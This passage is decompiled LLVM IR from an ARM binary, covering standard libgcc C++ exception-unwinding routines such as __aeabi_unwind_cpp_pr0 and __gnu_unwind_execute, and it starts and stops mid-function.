  uselistorder label %dec_label_pc_18fdc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18fa0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18f1c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18e5c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18e58, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18db8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18d14, { 1, 0 }
  uselistorder label %dec_label_pc_18d14.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18d14.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_191b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_191b4:
  %v0_191b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_191b4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_191b4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_191b4, %bb
  %v10_191bc = phi i32 [ %arg1, %dec_label_pc_191b4 ], [ 0, %bb ]
  ret i32 %v10_191bc

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 26, 27, 28, 44, 22, 25, 45, 46, 47, 48, 49, 5, 4, 50, 40, 41, 29, 30, 23, 33, 32, 31, 34, 6, 8, 7, 20, 43, 42, 24, 19, 36, 12, 37, 21, 11, 10, 9, 13, 14, 15, 16, 17, 18, 39, 35, 38, 51, 52 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191c4 = load i32, i32* @r1, align 4
  %v2_191c4 = load i32, i32* @r2, align 4
  %v4_191c4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_191c4, i32 %v2_191c4, i32 2)
  ret i32 %v4_191c4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191cc = load i32, i32* @r1, align 4
  %v2_191cc = load i32, i32* @r2, align 4
  %v4_191cc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_191cc, i32 %v2_191cc, i32 1)
  ret i32 %v4_191cc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191d4 = load i32, i32* @r1, align 4
  %v2_191d4 = load i32, i32* @r2, align 4
  %v4_191d4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_191d4, i32 %v2_191d4, i32 0)
  ret i32 %v4_191d4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 11, 12, 61, 13, 0, 22, 14, 23, 62, 63, 64, 18, 19, 20, 21, 43, 44, 45, 46, 65, 66, 67, 81, 82, 83, 84, 1, 70, 71, 2, 72, 73, 3, 74, 68, 69, 37, 38, 4, 5, 6, 59, 60, 7, 8, 47, 48, 49, 75, 76, 77, 78, 79, 80, 39, 40, 41, 50, 51, 52, 54, 26, 15, 16, 17, 29, 30, 27, 28, 24, 25, 31, 32, 33, 34, 35, 36, 42, 9, 53, 55, 56, 57, 58 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_191dc = add i32 %tmp, 56
  %v4_191dc = inttoptr i32 %v3_191dc to i32*
  %v5_191dc = load i32, i32* %v4_191dc, align 4
  %v6_191dc = add i32 %tmp, 60
  %v7_191dc = inttoptr i32 %v6_191dc to i32*
  %v8_191dc = load i32, i32* %v7_191dc, align 4
  %v2_191e8 = load i32, i32* %arg1, align 4
  %v3_191e8 = add i32 %tmp, 4
  %v4_191e8 = inttoptr i32 %v3_191e8 to i32*
  %v5_191e8 = load i32, i32* %v4_191e8, align 4
  store i32 %v5_191e8, i32* @r1, align 4
  %v12_191e8 = add i32 %tmp, 16
  %v13_191e8 = inttoptr i32 %v12_191e8 to i32*
  %v14_191e8 = load i32, i32* %v13_191e8, align 4
  store i32 %v14_191e8, i32* @r4, align 4
  %v15_191e8 = add i32 %tmp, 20
  %v16_191e8 = inttoptr i32 %v15_191e8 to i32*
  %v17_191e8 = load i32, i32* %v16_191e8, align 4
  store i32 %v17_191e8, i32* @r5, align 4
  %v18_191e8 = add i32 %tmp, 24
  %v19_191e8 = inttoptr i32 %v18_191e8 to i32*
  %v20_191e8 = load i32, i32* %v19_191e8, align 4
  store i32 %v20_191e8, i32* @r6, align 4
  %v21_191e8 = add i32 %tmp, 28
  %v22_191e8 = inttoptr i32 %v21_191e8 to i32*
  %v23_191e8 = load i32, i32* %v22_191e8, align 4
  store i32 %v23_191e8, i32* @r7, align 4
  %v24_191e8 = add i32 %tmp, 32
  %v25_191e8 = inttoptr i32 %v24_191e8 to i32*
  %v26_191e8 = load i32, i32* %v25_191e8, align 4
  store i32 %v26_191e8, i32* @r8, align 4
  %v27_191e8 = add i32 %tmp, 36
  %v28_191e8 = inttoptr i32 %v27_191e8 to i32*
  %v29_191e8 = load i32, i32* %v28_191e8, align 4
  store i32 %v29_191e8, i32* @sb, align 4
  %v30_191e8 = add i32 %tmp, 40
  %v31_191e8 = inttoptr i32 %v30_191e8 to i32*
  %v32_191e8 = load i32, i32* %v31_191e8, align 4
  store i32 %v32_191e8, i32* @sl, align 4
  store i32 %v8_191dc, i32* @ip, align 4
  store i32 %v5_191dc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_191dc)
  ret i32 %v2_191e8

; uselistorder directives
  uselistorder i32 %v8_191dc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 43, 44, 45, 46, 13, 14, 5, 0, 49, 6, 7, 47, 48, 11, 12, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 1, 83, 84, 85, 86, 87, 88, 89, 90, 91, 8, 92, 93, 35, 36, 2, 37, 38, 39, 40, 41, 42, 33, 17, 34, 9, 20, 10, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 117, 118, 119, 7, 8, 9, 10, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 1, 91, 92, 74, 75, 18, 19, 20, 21, 22, 23, 24, 25, 2, 3, 4, 5, 6, 30, 31, 26, 27, 28, 29, 11, 12, 13, 14, 15, 16, 17, 32, 0, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 93, 94, 95, 96, 97, 98, 112, 113, 114, 115, 116 }
  uselistorder i32 36, { 21, 20, 4, 22, 6, 7, 5, 16, 19, 8, 17, 9, 0, 1, 2, 3, 10, 11, 18, 12, 13, 14, 15 }
  uselistorder i32* @r8, { 282, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 2, 281, 0, 47, 283, 13, 284, 48, 49, 50, 51, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 52, 53, 54, 55, 14, 285, 15, 31, 32, 5, 33, 217, 218, 6, 219, 220, 221, 245, 246, 247, 248, 249, 11, 250, 251, 252, 253, 254, 255, 256, 257, 204, 205, 206, 207, 189, 190, 191, 192, 193, 168, 169, 170, 171, 61, 62, 63, 64, 16, 17, 18, 105, 106, 107, 108, 109, 65, 66, 67, 68, 110, 111, 112, 113, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 19, 30, 79, 80, 81, 82, 7, 56, 1, 57, 58, 59, 12, 60, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 98, 95, 96, 97, 101, 99, 100, 10, 102, 103, 104, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 8, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 194, 195, 196, 197, 198, 199, 9, 200, 201, 202, 203, 208, 209, 3, 210, 211, 212, 213, 214, 215, 216, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 258, 259, 260, 261, 262, 263 }
  uselistorder i32 32, { 93, 90, 91, 92, 52, 94, 95, 48, 63, 96, 47, 87, 53, 49, 72, 70, 71, 67, 68, 69, 79, 80, 73, 74, 65, 66, 77, 78, 54, 85, 86, 88, 2, 3, 5, 4, 89, 7, 6, 9, 8, 11, 10, 12, 50, 55, 51, 81, 56, 14, 13, 60, 57, 58, 59, 16, 15, 18, 17, 20, 19, 64, 22, 21, 24, 23, 25, 27, 26, 29, 28, 30, 31, 33, 32, 75, 76, 82, 34, 83, 35, 84, 36, 37, 38, 39, 61, 40, 41, 42, 62, 43, 0, 44, 1, 45, 46 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 75, 76, 66, 67, 7, 11, 94, 89, 90, 91, 1, 77, 78, 79, 38, 39, 12, 68, 69, 70, 49, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 71, 72, 73, 74, 13, 14, 15, 16, 17, 18, 19, 20, 21, 80, 22, 23, 2, 24, 25, 26, 3, 27, 28, 4, 29, 30, 81, 31, 5, 82, 32, 83, 84, 85, 86, 33, 34, 6, 87, 35, 88, 36, 92, 37, 93 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 8, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 9, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 10, 114, 115, 116, 3, 51, 11, 52, 53, 0, 30, 43, 12, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 6, 105, 27, 106, 107, 108, 109, 7, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 185, 18, 19, 20, 4, 186, 187, 65, 66, 82, 45, 2, 189, 46, 188, 168, 47, 48, 49, 21, 67, 1, 68, 69, 22, 192, 23, 5, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 6, 210, 211, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 24, 175, 119, 120, 212, 25, 214, 215, 216, 217, 131, 132, 31, 93, 32, 213, 26, 33, 176, 177, 178, 179, 180, 181, 182, 183, 184, 44, 111, 112, 170, 7, 166, 167, 8, 171, 174, 172, 9, 173, 94, 95, 27, 158, 153, 96, 159, 169, 133, 134, 12, 34, 35, 36, 37, 38, 39, 40, 10, 220, 221, 222, 223, 0, 224, 30, 83, 121, 154, 97, 218, 219, 190, 191, 28, 13, 98, 122, 123, 124, 125, 126, 29, 135, 136, 99, 100, 41, 42, 43, 101, 102, 103, 105, 106, 104, 84, 85, 87, 89, 86, 14, 88, 15, 90, 91, 92, 137, 107, 108, 109, 110, 113, 114, 115, 16, 116, 117, 118, 127, 128, 129, 17, 130, 162, 163, 11, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 157, 160, 161, 164, 165 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_191f8 = load i32, i32* @r0, align 4
  ret i32 %v1_191f8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19200 = load i32, i32* @r0, align 4
  ret i32 %v1_19200
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19214 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19218 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19214, i32 0)
  ret i32 %v2_19218

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19238 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1923c = call i32 @__gnu_Unwind_Resume(i32 %v2_19238, i32 0)
  ret i32 %v2_1923c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1925c = ptrtoint i32* %stack_var_-68 to i32
  %v2_19260 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1925c, i32 0)
  ret i32 %v2_19260

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19280 = ptrtoint i32* %stack_var_-68 to i32
  %v6_19284 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_19280, i32 %arg2, i8* %arg3, i32 %v2_19280)
  ret i32 %v6_19284

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_192b0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_192b8 = add i32 %tmp1, 76
  %v2_192b8 = inttoptr i32 %v1_192b8 to i32*
  %v3_192b8 = load i32, i32* %v2_192b8, align 4
  %v1_192bc = add i32 %v3_192b8, 7
  %v2_192bc = inttoptr i32 %v1_192bc to i8*
  %v3_192bc = load i8, i8* %v2_192bc, align 1
  %v4_192bc = zext i8 %v3_192bc to i32
  %v1_192c0 = add i32 %v3_192b8, 8
  %v3_192c4 = mul nuw nsw i32 %v4_192bc, 4
  %v2_192c8 = add i32 %v3_192c4, %v1_192c0
  %v3_192c8 = inttoptr i32 %v2_192c8 to i8*
  ret i8* %v3_192c8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_192d8 = load i32, i32* @r6, align 4
  %v21_192d8 = load i32, i32* @lr, align 4
  %v0_192dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_192dc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %dec_label_pc_192ec.backedge, %entry
  %v3_192f8 = phi i32 [ %v0_192ec.pre, %dec_label_pc_192ec.backedge ], [ %tmp, %entry ]
  %v1_192ec = add i32 %v3_192f8, 8
  %v2_192ec = inttoptr i32 %v1_192ec to i8*
  %v3_192ec = load i8, i8* %v2_192ec, align 1
  %v4_192ec = zext i8 %v3_192ec to i32
  store i32 %v4_192ec, i32* %r3.global-to-local, align 4
  %v2_192f0 = icmp eq i8 %v3_192ec, 0
  store i1 %v2_192f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192f0, label %dec_label_pc_19300, label %.thread

.thread:                                          ; preds = %dec_label_pc_192ec
  %v2_192f4 = add nsw i32 %v4_192ec, -1
  store i32 %v2_192f4, i32* %r3.global-to-local, align 4
  %v2_192f8 = trunc i32 %v2_192f4 to i8
  store i8 %v2_192f8, i8* %v2_192ec, align 1
  %v0_192fc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192fc.pr.pr, label %.thread.dec_label_pc_19300_crit_edge, label %dec_label_pc_19328

.thread.dec_label_pc_19300_crit_edge:             ; preds = %.thread
  %v0_19300.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %.thread.dec_label_pc_19300_crit_edge, %dec_label_pc_192ec
  %v0_19300 = phi i32 [ %v0_19300.pre, %.thread.dec_label_pc_19300_crit_edge ], [ %v3_192f8, %dec_label_pc_192ec ]
  %v1_19300 = add i32 %v0_19300, 9
  %v2_19300 = inttoptr i32 %v1_19300 to i8*
  %v3_19300 = load i8, i8* %v2_19300, align 1
  %v4_19300 = zext i8 %v3_19300 to i32
  store i32 %v4_19300, i32* %r3.global-to-local, align 4
  %v2_19304 = icmp eq i8 %v3_19300, 0
  store i1 %v2_19304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19304, label %dec_label_pc_19408, label %dec_label_pc_1930c

dec_label_pc_1930c:                               ; preds = %dec_label_pc_193fc, %dec_label_pc_19300
  %v2_19310 = phi i32 [ %v0_193fc, %dec_label_pc_193fc ], [ %v0_19300, %dec_label_pc_19300 ]
  %v0_1930c = phi i32 [ %v4_193fc, %dec_label_pc_193fc ], [ %v4_19300, %dec_label_pc_19300 ]
  %v1_1930c = add nsw i32 %v0_1930c, -1
  store i32 %v1_1930c, i32* %r3.global-to-local, align 4
  %v1_19310 = trunc i32 %v1_1930c to i8
  %v3_19310 = add i32 %v2_19310, 9
  %v4_19310 = inttoptr i32 %v3_19310 to i8*
  store i8 %v1_19310, i8* %v4_19310, align 1
  %v0_19314 = load i32, i32* @r5, align 4
  %v1_19314 = add i32 %v0_19314, 4
  %v2_19314 = inttoptr i32 %v1_19314 to i32*
  %v3_19314 = load i32, i32* %v2_19314, align 4
  store i32 %v3_19314, i32* %r2.global-to-local, align 4
  %v1_19318 = inttoptr i32 %v3_19314 to i32*
  %v2_19318 = load i32, i32* %v1_19318, align 4
  store i32 %v2_19318, i32* %r0.global-to-local, align 4
  %v4_19318 = add i32 %v3_19314, 4
  store i32 %v4_19318, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19320 = inttoptr i32 %v0_19314 to i32*
  store i32 %v2_19318, i32* %v1_19320, align 4
  %v5_19320 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19320, i32* %v2_19314, align 4
  %v0_19324 = load i32, i32* %r3.global-to-local, align 4
  %v1_19324 = trunc i32 %v0_19324 to i8
  %v2_19324 = load i32, i32* @r5, align 4
  %v3_19324 = add i32 %v2_19324, 8
  %v4_19324 = inttoptr i32 %v3_19324 to i8*
  store i8 %v1_19324, i8* %v4_19324, align 1
  br label %dec_label_pc_19328

dec_label_pc_19328:                               ; preds = %.thread, %dec_label_pc_1930c, %.thread6
  %v0_19328 = load i32, i32* @r5, align 4
  %v1_19328 = inttoptr i32 %v0_19328 to i32*
  %v2_19328 = load i32, i32* %v1_19328, align 4
  %v3_1932c = udiv i32 %v2_19328, 16777216
  store i32 %v3_1932c, i32* @r4, align 4
  store i32 %v3_1932c, i32* %ip.global-to-local, align 4
  %v3_19334 = mul i32 %v2_19328, 256
  store i32 %v3_19334, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19328, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_19334, i32* %v1_19328, align 4
  br i1 %tmp183, label %dec_label_pc_19408, label %dec_label_pc_19344

dec_label_pc_19344:                               ; preds = %dec_label_pc_19328
  %v0_19344 = load i32, i32* @r4, align 4
  %v1_19344 = and i32 %v0_19344, 128
  store i32 %v1_19344, i32* %r1.global-to-local, align 4
  %v2_19344 = icmp eq i32 %v1_19344, 0
  store i1 %v2_19344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19344, label %dec_label_pc_19420, label %dec_label_pc_1934c

dec_label_pc_1934c:                               ; preds = %dec_label_pc_19344
  %v1_1934c = and i32 %v0_19344, 240
  store i32 %v1_1934c, i32* @r6, align 4
  %v7_19350 = icmp eq i32 %v1_1934c, 128
  store i1 %v7_19350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19350, label %dec_label_pc_19358, label %dec_label_pc_1947c

dec_label_pc_19358:                               ; preds = %dec_label_pc_1934c
  %v0_19358 = load i32, i32* @r5, align 4
  %v1_19358 = add i32 %v0_19358, 8
  %v2_19358 = inttoptr i32 %v1_19358 to i8*
  %v3_19358 = load i8, i8* %v2_19358, align 1
  %v4_19358 = zext i8 %v3_19358 to i32
  store i32 %v4_19358, i32* %r3.global-to-local, align 4
  %v2_1935c = icmp eq i8 %v3_19358, 0
  store i1 %v2_1935c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1935c, label %dec_label_pc_1936c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19358
  %v2_19360 = add nsw i32 %v4_19358, -1
  store i32 %v2_19360, i32* %r3.global-to-local, align 4
  %v2_19364 = trunc i32 %v2_19360 to i8
  store i8 %v2_19364, i8* %v2_19358, align 1
  %v0_19368.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19368.pr.pr, label %.thread3.dec_label_pc_1936c_crit_edge, label %dec_label_pc_1939c

.thread3.dec_label_pc_1936c_crit_edge:            ; preds = %.thread3
  %v0_1936c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1936c

dec_label_pc_1936c:                               ; preds = %.thread3.dec_label_pc_1936c_crit_edge, %dec_label_pc_19358
  %v2_19380 = phi i32 [ %v0_1936c.pre, %.thread3.dec_label_pc_1936c_crit_edge ], [ %v0_19358, %dec_label_pc_19358 ]
  %v1_1936c = add i32 %v2_19380, 9
  %v2_1936c = inttoptr i32 %v1_1936c to i8*
  %v3_1936c = load i8, i8* %v2_1936c, align 1
  %v4_1936c = zext i8 %v3_1936c to i32
  store i32 %v4_1936c, i32* %r3.global-to-local, align 4
  %v2_19370 = icmp eq i8 %v3_1936c, 0
  store i1 %v2_19370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19370, label %dec_label_pc_193ac, label %dec_label_pc_1937c

dec_label_pc_1937c:                               ; preds = %dec_label_pc_1936c
  %v1_1937c = add nsw i32 %v4_1936c, -1
  store i32 %v1_1937c, i32* %r3.global-to-local, align 4
  %v1_19380 = trunc i32 %v1_1937c to i8
  store i8 %v1_19380, i8* %v2_1936c, align 1
  %v0_19384 = load i32, i32* @r5, align 4
  %v1_19384 = add i32 %v0_19384, 4
  %v2_19384 = inttoptr i32 %v1_19384 to i32*
  %v3_19384 = load i32, i32* %v2_19384, align 4
  store i32 %v3_19384, i32* %r2.global-to-local, align 4
  %v1_19388 = inttoptr i32 %v3_19384 to i32*
  %v2_19388 = load i32, i32* %v1_19388, align 4
  store i32 %v2_19388, i32* %r0.global-to-local, align 4
  %v4_19388 = add i32 %v3_19384, 4
  store i32 %v4_19388, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19388, i32* %v2_19384, align 4
  %v0_19394 = load i32, i32* %r3.global-to-local, align 4
  %v1_19394 = trunc i32 %v0_19394 to i8
  %v2_19394 = load i32, i32* @r5, align 4
  %v3_19394 = add i32 %v2_19394, 8
  %v4_19394 = inttoptr i32 %v3_19394 to i8*
  store i8 %v1_19394, i8* %v4_19394, align 1
  %v0_19398 = load i32, i32* %r0.global-to-local, align 4
  %v1_19398 = load i32, i32* @r5, align 4
  %v2_19398 = inttoptr i32 %v1_19398 to i32*
  store i32 %v0_19398, i32* %v2_19398, align 4
  br label %dec_label_pc_1939c

dec_label_pc_1939c:                               ; preds = %.thread3, %dec_label_pc_1937c
  %v0_1939c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1939c, i32* %r3.global-to-local, align 4
  %v3_193a0 = mul i32 %v0_1939c, 256
  store i32 %v3_193a0, i32* %r0.global-to-local, align 4
  %v1_193a4 = load i32, i32* @r5, align 4
  %v2_193a4 = inttoptr i32 %v1_193a4 to i32*
  store i32 %v3_193a0, i32* %v2_193a4, align 4
  %v0_193a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_193a8 = udiv i32 %v0_193a8, 16777216
  br label %dec_label_pc_193ac

dec_label_pc_193ac:                               ; preds = %dec_label_pc_1936c, %dec_label_pc_1939c
  %storemerge133 = phi i32 [ %v3_193a8, %dec_label_pc_1939c ], [ 176, %dec_label_pc_1936c ]
  %v1_193ac = load i32, i32* %ip.global-to-local, align 4
  %v4_193ac = mul i32 %v1_193ac, 256
  %v5_193ac = or i32 %v4_193ac, %storemerge133
  store i32 %v5_193ac, i32* %r2.global-to-local, align 4
  %v7_193b0 = icmp eq i32 %v5_193ac, 32768
  store i1 %v7_193b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_193b0, label %dec_label_pc_195bc, label %dec_label_pc_193b8

dec_label_pc_193b8:                               ; preds = %dec_label_pc_193ac
  %v3_193b8 = mul i32 %v5_193ac, 16
  store i32 %v3_193b8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_193c8 = and i32 %v3_193b8, 65520
  store i32 %v3_193c8, i32* %r2.global-to-local, align 4
  %v0_193cc = load i32, i32* @r7, align 4
  store i32 %v0_193cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_193d4 = call i32 @_Unwind_VRS_Pop(i32 %v0_193cc, i32 %v3_193c8, i32 0, i32 0)
  store i32 %v4_193d4, i32* %r0.global-to-local, align 4
  %v2_193d8 = icmp eq i32 %v4_193d4, 0
  store i1 %v2_193d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193d8, label %dec_label_pc_193e0, label %dec_label_pc_195bc

dec_label_pc_193e0:                               ; preds = %dec_label_pc_193b8
  %v0_193e0 = load i32, i32* @r5, align 4
  %v1_193e0 = add i32 %v0_193e0, 8
  %v2_193e0 = inttoptr i32 %v1_193e0 to i8*
  %v3_193e0 = load i8, i8* %v2_193e0, align 1
  %v4_193e0 = zext i8 %v3_193e0 to i32
  store i32 %v4_193e0, i32* %r3.global-to-local, align 4
  %v0_193e4 = load i32, i32* @r4, align 4
  %v1_193e4 = and i32 %v0_193e4, 32768
  %v2_193e4 = icmp eq i32 %v1_193e4, 0
  store i1 %v2_193e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193e4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_193e0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_193e0, %bb147
